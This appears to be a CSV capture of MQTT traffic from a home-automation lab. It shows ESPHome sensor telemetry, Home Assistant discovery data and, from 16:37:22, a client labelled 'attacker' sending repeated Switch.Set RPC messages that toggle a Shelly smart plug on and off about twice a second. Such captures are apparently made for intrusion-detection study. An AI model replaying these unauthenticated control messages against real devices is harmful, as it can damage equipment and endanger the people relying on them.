timestamp,topic,payload_size_bytes,payload_preview
2026-04-22T16:35:07,shellyazplug-e4b323337220/online,5,false
2026-04-22T16:35:07,iot/dht11/debug,46,[0;36m[D][sensor:124]: 'Humidity' >> 39 %[0m
2026-04-22T16:35:07,iot/dht11/status,6,online
2026-04-22T16:35:07,iot/dht11/sensor/temperature/state,4,24.8
2026-04-22T16:35:07,iot/dht11/sensor/humidity/state,2,39
2026-04-22T16:35:07,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:35:07,iot/mq/status,6,online
2026-04-22T16:35:07,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:35:07,iot/pir/debug,50,[0;36m[D][binary_sensor:048]: 'Motion' >> OFF[0m
2026-04-22T16:35:07,iot/pir/status,6,online
2026-04-22T16:35:07,iot/pir/binary_sensor/motion/state,3,OFF
2026-04-22T16:35:07,homeassistant/sensor/dht11_node/temperature/config,380,"{""sug_dsp_prc"":1,""unit_of_meas"":""°C"",""stat_cla"":""measurement"",""name"":""Temperature"",""dev_cla"":""temperature"",""stat_t"":""iot"
2026-04-22T16:35:07,homeassistant/sensor/dht11_node/humidity/config,366,"{""sug_dsp_prc"":0,""unit_of_meas"":""%"",""stat_cla"":""measurement"",""name"":""Humidity"",""dev_cla"":""humidity"",""stat_t"":""iot/dht11/"
2026-04-22T16:35:07,homeassistant/sensor/mq_node/gas_sensor/config,362,"{""sug_dsp_prc"":2,""unit_of_meas"":""V"",""stat_cla"":""measurement"",""name"":""Gas Sensor"",""dev_cla"":""voltage"",""stat_t"":""iot/mq/se"
2026-04-22T16:35:07,homeassistant/binary_sensor/pir_node/motion/config,306,"{""name"":""Motion"",""dev_cla"":""motion"",""stat_t"":""iot/pir/binary_sensor/motion/state"",""avty_t"":""iot/pir/status"",""uniq_id"":""E"
2026-04-22T16:35:07,esphome/discover/dht11_node,149,"{""ip"":""192.168.8.167"",""name"":""dht11_node"",""version"":""2026.3.2"",""mac"":""348518b90f38"",""platform"":""ESP32"",""board"":""esp32-s3"
2026-04-22T16:35:07,esphome/discover/mq_node,146,"{""ip"":""192.168.8.203"",""name"":""mq_node"",""version"":""2026.3.2"",""mac"":""348518b91934"",""platform"":""ESP32"",""board"":""esp32-s3-de"
2026-04-22T16:35:07,esphome/discover/pir_node,147,"{""ip"":""192.168.8.215"",""name"":""pir_node"",""version"":""2026.3.2"",""mac"":""348518b90f68"",""platform"":""ESP32"",""board"":""esp32-s3-d"
2026-04-22T16:35:07,shellyazplug-node/online,4,true
2026-04-22T16:35:10,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:35:10,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:35:15,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:35:15,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:35:16,iot/dht11/debug,59,[0;36m[D][dht:048]: Temperature 24.8°C Humidity 39.0%[0m
2026-04-22T16:35:16,iot/dht11/debug,53,[0;36m[D][sensor:124]: 'Temperature' >> 24.8 °C[0m
2026-04-22T16:35:16,iot/dht11/sensor/temperature/state,4,24.8
2026-04-22T16:35:16,iot/dht11/debug,46,[0;36m[D][sensor:124]: 'Humidity' >> 39 %[0m
2026-04-22T16:35:16,iot/dht11/sensor/humidity/state,2,39
2026-04-22T16:35:20,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:35:20,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:35:25,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:35:25,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:35:26,iot/dht11/debug,59,[0;36m[D][dht:048]: Temperature 24.8°C Humidity 39.0%[0m
2026-04-22T16:35:26,iot/dht11/debug,53,[0;36m[D][sensor:124]: 'Temperature' >> 24.8 °C[0m
2026-04-22T16:35:26,iot/dht11/sensor/temperature/state,4,24.8
2026-04-22T16:35:26,iot/dht11/debug,46,[0;36m[D][sensor:124]: 'Humidity' >> 39 %[0m
2026-04-22T16:35:26,iot/dht11/sensor/humidity/state,2,39
2026-04-22T16:35:30,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:35:30,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:35:35,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:35:35,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:35:36,iot/dht11/debug,59,[0;36m[D][dht:048]: Temperature 24.8°C Humidity 39.0%[0m
2026-04-22T16:35:36,iot/dht11/debug,53,[0;36m[D][sensor:124]: 'Temperature' >> 24.8 °C[0m
2026-04-22T16:35:36,iot/dht11/sensor/temperature/state,4,24.8
2026-04-22T16:35:36,iot/dht11/debug,46,[0;36m[D][sensor:124]: 'Humidity' >> 39 %[0m
2026-04-22T16:35:36,iot/dht11/sensor/humidity/state,2,39
2026-04-22T16:35:40,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:35:40,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:35:45,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:35:45,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:35:46,iot/dht11/debug,59,[0;36m[D][dht:048]: Temperature 24.8°C Humidity 39.0%[0m
2026-04-22T16:35:46,iot/dht11/debug,53,[0;36m[D][sensor:124]: 'Temperature' >> 24.8 °C[0m
2026-04-22T16:35:46,iot/dht11/sensor/temperature/state,4,24.8
2026-04-22T16:35:46,iot/dht11/debug,46,[0;36m[D][sensor:124]: 'Humidity' >> 39 %[0m
2026-04-22T16:35:46,iot/dht11/sensor/humidity/state,2,39
2026-04-22T16:35:50,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:35:50,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:35:55,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:35:55,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:35:56,iot/dht11/debug,59,[0;36m[D][dht:048]: Temperature 24.8°C Humidity 39.0%[0m
2026-04-22T16:35:56,iot/dht11/debug,53,[0;36m[D][sensor:124]: 'Temperature' >> 24.8 °C[0m
2026-04-22T16:35:56,iot/dht11/sensor/temperature/state,4,24.8
2026-04-22T16:35:56,iot/dht11/debug,46,[0;36m[D][sensor:124]: 'Humidity' >> 39 %[0m
2026-04-22T16:35:56,iot/dht11/sensor/humidity/state,2,39
2026-04-22T16:36:00,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:36:00,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:36:05,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:36:05,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:36:06,iot/dht11/debug,59,[0;36m[D][dht:048]: Temperature 24.8°C Humidity 39.0%[0m
2026-04-22T16:36:06,iot/dht11/debug,53,[0;36m[D][sensor:124]: 'Temperature' >> 24.8 °C[0m
2026-04-22T16:36:06,iot/dht11/sensor/temperature/state,4,24.8
2026-04-22T16:36:06,iot/dht11/debug,46,[0;36m[D][sensor:124]: 'Humidity' >> 39 %[0m
2026-04-22T16:36:06,iot/dht11/sensor/humidity/state,2,39
2026-04-22T16:36:10,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:36:10,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:36:15,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:36:15,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:36:16,iot/dht11/debug,59,[0;36m[D][dht:048]: Temperature 24.8°C Humidity 39.0%[0m
2026-04-22T16:36:16,iot/dht11/debug,53,[0;36m[D][sensor:124]: 'Temperature' >> 24.8 °C[0m
2026-04-22T16:36:16,iot/dht11/sensor/temperature/state,4,24.8
2026-04-22T16:36:16,iot/dht11/debug,46,[0;36m[D][sensor:124]: 'Humidity' >> 39 %[0m
2026-04-22T16:36:16,iot/dht11/sensor/humidity/state,2,39
2026-04-22T16:36:20,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:36:20,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:36:25,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:36:25,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:36:26,iot/dht11/debug,59,[0;36m[D][dht:048]: Temperature 24.8°C Humidity 39.0%[0m
2026-04-22T16:36:26,iot/dht11/debug,53,[0;36m[D][sensor:124]: 'Temperature' >> 24.8 °C[0m
2026-04-22T16:36:26,iot/dht11/sensor/temperature/state,4,24.8
2026-04-22T16:36:26,iot/dht11/debug,46,[0;36m[D][sensor:124]: 'Humidity' >> 39 %[0m
2026-04-22T16:36:26,iot/dht11/sensor/humidity/state,2,39
2026-04-22T16:36:30,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:36:30,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:36:35,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:36:35,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:36:36,iot/dht11/debug,59,[0;36m[D][dht:048]: Temperature 24.8°C Humidity 39.0%[0m
2026-04-22T16:36:36,iot/dht11/debug,53,[0;36m[D][sensor:124]: 'Temperature' >> 24.8 °C[0m
2026-04-22T16:36:36,iot/dht11/sensor/temperature/state,4,24.8
2026-04-22T16:36:36,iot/dht11/debug,46,[0;36m[D][sensor:124]: 'Humidity' >> 39 %[0m
2026-04-22T16:36:36,iot/dht11/sensor/humidity/state,2,39
2026-04-22T16:36:40,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:36:40,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:36:45,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:36:45,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:36:46,iot/dht11/debug,59,[0;36m[D][dht:048]: Temperature 24.8°C Humidity 39.0%[0m
2026-04-22T16:36:46,iot/dht11/debug,53,[0;36m[D][sensor:124]: 'Temperature' >> 24.8 °C[0m
2026-04-22T16:36:46,iot/dht11/sensor/temperature/state,4,24.8
2026-04-22T16:36:46,iot/dht11/debug,46,[0;36m[D][sensor:124]: 'Humidity' >> 39 %[0m
2026-04-22T16:36:46,iot/dht11/sensor/humidity/state,2,39
2026-04-22T16:36:50,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:36:50,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:36:55,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:36:55,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:36:56,iot/dht11/debug,59,[0;36m[D][dht:048]: Temperature 24.8°C Humidity 39.0%[0m
2026-04-22T16:36:56,iot/dht11/debug,53,[0;36m[D][sensor:124]: 'Temperature' >> 24.8 °C[0m
2026-04-22T16:36:56,iot/dht11/sensor/temperature/state,4,24.8
2026-04-22T16:36:56,iot/dht11/debug,46,[0;36m[D][sensor:124]: 'Humidity' >> 39 %[0m
2026-04-22T16:36:56,iot/dht11/sensor/humidity/state,2,39
2026-04-22T16:37:00,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:37:00,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:37:05,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:37:05,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:37:06,iot/dht11/debug,59,[0;36m[D][dht:048]: Temperature 24.8°C Humidity 39.0%[0m
2026-04-22T16:37:06,iot/dht11/debug,53,[0;36m[D][sensor:124]: 'Temperature' >> 24.8 °C[0m
2026-04-22T16:37:06,iot/dht11/sensor/temperature/state,4,24.8
2026-04-22T16:37:06,iot/dht11/debug,46,[0;36m[D][sensor:124]: 'Humidity' >> 39 %[0m
2026-04-22T16:37:06,iot/dht11/sensor/humidity/state,2,39
2026-04-22T16:37:10,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:37:10,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:37:15,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:37:15,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:37:16,iot/dht11/debug,59,[0;36m[D][dht:048]: Temperature 24.9°C Humidity 39.0%[0m
2026-04-22T16:37:16,iot/dht11/debug,53,[0;36m[D][sensor:124]: 'Temperature' >> 24.9 °C[0m
2026-04-22T16:37:16,iot/dht11/sensor/temperature/state,4,24.9
2026-04-22T16:37:16,iot/dht11/debug,46,[0;36m[D][sensor:124]: 'Humidity' >> 39 %[0m
2026-04-22T16:37:16,iot/dht11/sensor/humidity/state,2,39
2026-04-22T16:37:20,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:37:20,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:37:22,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:37:22,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:37:22,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4905 34375.417 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:37:23,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:37:23,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:37:23,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4906 34375.916 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:37:23,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.8, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:37:23,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34375.91,""swi"
2026-04-22T16:37:23,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 4907 34375.934 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:37:23,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:37:23,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:37:23,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4908 34376.416 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:37:23,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.8, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:37:23,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34376.41,""swi"
2026-04-22T16:37:23,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 4909 34376.433 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:37:24,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:37:24,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:37:24,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4910 34376.919 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:37:24,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.6, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:37:24,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34376.92,""swi"
2026-04-22T16:37:24,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 4911 34376.938 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:37:24,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:37:24,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:37:24,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4912 34377.416 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:37:24,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.6, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:37:24,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34377.41,""swi"
2026-04-22T16:37:24,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 4913 34377.432 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:37:25,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:37:25,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:37:25,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4914 34377.917 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:37:25,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.6, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:37:25,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34377.91,""swi"
2026-04-22T16:37:25,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 4915 34377.936 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:37:25,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:37:25,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:37:25,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:37:25,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:37:25,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4916 34378.417 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:37:25,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.6, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:37:25,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34378.41,""swi"
2026-04-22T16:37:25,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 4917 34378.434 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:37:26,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:37:26,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:37:26,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4918 34378.918 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:37:26,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.7, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:37:26,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34378.91,""swi"
2026-04-22T16:37:26,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 4919 34378.937 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:37:26,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:37:26,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:37:26,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4920 34379.418 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:37:26,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.7, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:37:26,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34379.42,""swi"
2026-04-22T16:37:26,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 4921 34379.435 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:37:26,iot/dht11/debug,59,[0;36m[D][dht:048]: Temperature 24.9°C Humidity 39.0%[0m
2026-04-22T16:37:26,iot/dht11/debug,53,[0;36m[D][sensor:124]: 'Temperature' >> 24.9 °C[0m
2026-04-22T16:37:26,iot/dht11/sensor/temperature/state,4,24.9
2026-04-22T16:37:26,iot/dht11/debug,46,[0;36m[D][sensor:124]: 'Humidity' >> 39 %[0m
2026-04-22T16:37:26,iot/dht11/sensor/humidity/state,2,39
2026-04-22T16:37:27,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:37:27,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:37:27,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4922 34379.920 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:37:27,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.6, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:37:27,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34379.92,""swi"
2026-04-22T16:37:27,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 4923 34379.938 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:37:27,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:37:27,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:37:27,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4924 34380.421 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:37:27,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.6, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:37:27,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34380.42,""swi"
2026-04-22T16:37:27,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 4925 34380.437 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:37:28,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:37:28,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:37:28,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4926 34380.921 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:37:28,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.6, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:37:28,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34380.92,""swi"
2026-04-22T16:37:28,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 4927 34380.939 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:37:28,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:37:28,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:37:28,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4928 34381.426 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:37:28,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.6, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:37:28,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34381.42,""swi"
2026-04-22T16:37:28,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 4929 34381.443 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:37:29,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:37:29,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:37:29,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4930 34381.925 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:37:29,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.5, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:37:29,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34381.92,""swi"
